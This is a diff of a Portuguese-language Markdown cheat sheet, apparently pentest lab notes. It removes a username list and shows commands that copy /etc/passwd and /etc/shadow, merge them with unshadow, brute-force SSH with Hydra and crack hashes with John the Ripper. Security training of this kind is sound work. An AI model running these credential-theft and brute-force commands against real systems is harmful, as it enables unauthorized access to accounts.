@@ -1,7 +1,3 @@
-## Lista de nomes de usuários
-```
-USERNAMES=("aline" "adriano" "beatriz" "breno" "claudia" "carlos" "douglas" "daniele" "emilia" "eduardo" "fernando" "flavia" "geraldo" "gisele" "heitor" "helena" "isabela" "igor" "jorge" "julia" "laura" "leonardo" "marcos" "maria" "natasha" "nicolas" "oswaldo" "odete" "paula" "pedro" "ricardo" "rafaela" "sandra" "samuel" "talita" "tiago" "ursula" "umberto" "vania" "valdir" "zilda" "zacarias" )
-```
 ## Download de wordlists
 ```
 wget https://github.com/sergiorez-cmd/secbitrez/raw/refs/heads/main/wordlists/wordlists.zip
@@ -71,17 +67,17 @@ cp /etc/passwd /tmp/passwd
 cp /etc/shadow /tmp/shadow
 "
 ```
-## Converter arquivos de hash para o formato compativel do John The Ripper
+## Converter arquivos de hash para o formato compativel do John The Ripper (Kali Linux)
 ```
 sudo bash -c " \
-unshadow /tmp/passwd /tmp/shadow > /tmp/hashes
+unshadow passwd shadow > hashes-linux.txt
 "
 ```
-## Executar Hydra para quebrar senhas de usuários via SSH
+## Executar Hydra para quebrar senhas de usuários via SSH (Kali Linux)
 ```
 hydra -l name_user -P /usr/share/wordlists/john.lst ssh://<Target_IP>
 ```
-## Executar John The Ripper para quebrar hashs das senhas dos usuários
+## Executar John The Ripper para quebrar hashs das senhas dos usuários (Kali Linux)
 ```
 john /tmp/hashes --wordlist=/usr/share/wordlists/john.lst --format=crypt
 ```
